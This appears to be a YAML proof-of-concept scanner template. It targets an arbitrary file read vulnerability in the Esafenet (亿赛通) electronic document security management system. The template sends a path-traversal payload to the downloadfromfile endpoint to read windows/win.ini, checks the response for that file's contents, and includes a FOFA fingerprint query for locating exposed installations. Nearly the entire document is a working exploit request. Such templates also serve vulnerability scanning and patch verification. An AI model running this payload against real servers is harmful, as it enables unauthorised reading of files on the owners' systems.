id: poc-yaml-yisaitong-esafenet-downloadfromfile-anyfile-read
info:
  name: 亿赛通电子文档安全管理系统 downloadfromfile 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
requests:
- method: POST
  path: /CDGServer3/downloadfromfile
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: fileName=../../../../../../../../../../../windows/win.ini
  expression: status_code == 200 && contains(body,"[files]") && contains(body,"; for
    16-bit app support") && contains(headers,"filename=") && !contains(body,"<")
variables: {}
transport: http
